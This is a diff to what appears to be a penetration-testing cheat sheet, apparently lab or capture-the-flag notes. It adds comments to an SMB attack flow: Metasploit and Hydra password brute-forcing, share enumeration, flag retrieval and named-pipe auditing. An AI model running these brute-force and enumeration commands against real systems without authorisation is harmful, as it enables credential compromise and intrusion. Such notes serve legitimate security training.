@@ -260,32 +260,43 @@ exploit
 ---
 
 ### SMB Enumeration & Exploitation Flow
-
+  
    ```bash
+   #  SMB Login Bruteforce (Metasploit)
    msfconsole -q
    use auxiliary/scanner/smb/smb_login
    set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
    set SMBUser <USERNAME>
    set RHOSTS <TARGET>
    exploit
+
+   # Hydra SMB Bruteforce (Optional)
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET> smb
+
+   # Enumerate Shares
    smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD>
    smbclient -L <TARGET> -U <USERNAME>
    smbclient //<TARGET>/<SHARE> -U <USERNAME>
+
+   # Retrieve Files
    ls
    cd hidden
    get flag.tar.gz
    exit
    tar -xf flag.tar.gz
-   cat flag
+   cat file
+
+   # Named Pipe Auditor
    msfconsole -q
    use auxiliary/scanner/smb/pipe_auditor
    set SMBUser <USERNAME>
    set SMBPass <PASSWORD>
    set RHOSTS <TARGET>
    exploit
-   enum4linux -r -u "<USERNAME>" -p "<PASSWORD>" <TARGET>
+
+   # Enum 4 Linux
+   enum4linux -r -u "<USERNAME>" -p "<PASSWORD>" <TARGET> 
    ```
 ---
 
